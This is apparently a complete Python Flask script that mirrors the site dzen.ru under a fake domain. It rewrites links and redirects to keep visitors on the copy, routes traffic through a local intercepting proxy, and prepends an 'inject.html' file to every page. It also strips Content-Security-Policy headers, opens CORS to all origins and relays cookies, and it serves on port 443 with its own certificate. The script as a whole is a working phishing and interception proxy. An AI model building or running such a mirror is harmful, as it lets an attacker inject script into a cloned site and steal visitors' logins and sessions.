from flask import Flask,request,make_response
import requests
import base64
import re
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

app = Flask(__name__)

def make_request(method, url, headers, post_data = None, retries = 3):
	proxies = {
		'http': 'http://192.168.1.49:9000',
		'https': 'http://192.168.1.49:9000',
	}
	if method not in ['GET', 'POST']:
		raise Exception("unsupported method = " + method)
	counter = 0
	while counter < retries:
		try:
			if method == 'GET':
				return requests.get(url, headers=headers, allow_redirects=False, verify=False, proxies=proxies)
			elif method == "POST":
				return requests.post(url, headers=headers, data=post_data, allow_redirects=False, verify=False, proxies=proxies)
		except Exception as e:
			print(">>>>>>>>>>>>>>> ERROR, repeating.... ERRURL = " + url + " | " + str(e), flush=True)
			counter += 1
			
def replace_domain(data, domain, fakeDomain):
	return re.sub("([^.])"+domain, "\g<1>"+fakeDomain, data)

@app.before_request
def main():
	fakeDomain = "faker.loc"
	domain = "dzen.ru"
	baseUrl = "https://"+domain
	path = ""
	url = request.args.get("_URL_")
	if url:
		# more relient to replace every time - just in case fake domain in url somehow
		#url = url.replace(fakeDomain, domain)
		if domain not in url and 'https://' not in url and 'http://' not in url:
			url = f"{baseUrl}{url}"
	else:	
		url = baseUrl + (request.path if request.path else path)
		query = request.query_string.decode("utf8")
		if query:
			url += "?" + query
	url = replace_domain(url, fakeDomain, domain)

	headers = {}
	for header in request.headers:
		k, v = header
		if k.lower() not in ['connection', 'host', 'origin', 'referer']:
			headers[k] = v

	response = make_request(request.method, url, headers, request.data)
	if int(response.status_code) in [301, 302]:
		responseFake = make_response(response.content)
		for cookie in response.cookies:
			responseFake.set_cookie(cookie.name, cookie.value)
		redirect = urllib.parse.quote_plus(response.headers['Location'])
		responseFake.headers['Location'] = f"https://{fakeDomain}?_URL_={redirect}"
		return responseFake, response.status_code

	data = response.content
	rtype = response.headers['content-type'] if 'content-type' in response.headers else ""
	#print("URL (orig) = "+request.full_path + "\n" + "URL (repl) = "+url + "\n" + "URL (code) = "+str(response.status_code)+"\n", flush=True)
	print("Response Code = "+str(response.status_code)+"\n", flush=True)

	# TODO: replace more clever - subdomains, encoded URLS and so on!!!
	if 'text' in rtype or 'application/javascript' in rtype:
		data = data.decode("utf8")
		# TODO: dangerous, see below
		#data = data.replace(domain, fakeDomain)
		data = replace_domain(data, domain, fakeDomain)
		#data = re.sub("\"(https\:\/\/.*)\"", "\"https://" + fakeDomain + "?_URL_=\g<1>\"", data)
		data = data.encode("utf8")
	if 'text/html' in rtype and not ".js" in url:
		wrapper = open("/root/Desktop/copier/inject.html").read() \
			.replace('{DOMAIN_ORIG}', domain) \
			.replace('{DOMAIN_FAKE}', fakeDomain)
		# first - wrapper, after - original content
		data = wrapper + data.decode("utf8")

	responseFake = make_response(data)
	#print(data, flush=True)
	for header in response.headers:
		if header.lower() not in ['content-length', 'content-encoding', 'content-security-policy', 'cross-origin-opener-policy', 'set-cookie']:
			responseFake.headers[header] = response.headers[header]
	responseFake.headers['Access-Control-Allow-Origin'] = '*'

	for cookie in response.cookies:
		responseFake.set_cookie(cookie.name, cookie.value)

	#print(responseFake.headers['content-type'], flush=True)
	#print(responseFake.headers, flush=True)
	return responseFake, response.status_code

app.run(host='0.0.0.0', port=443, debug=True, ssl_context=('/root/Desktop/copier/cert.pem', '/root/Desktop/copier/key.pem'))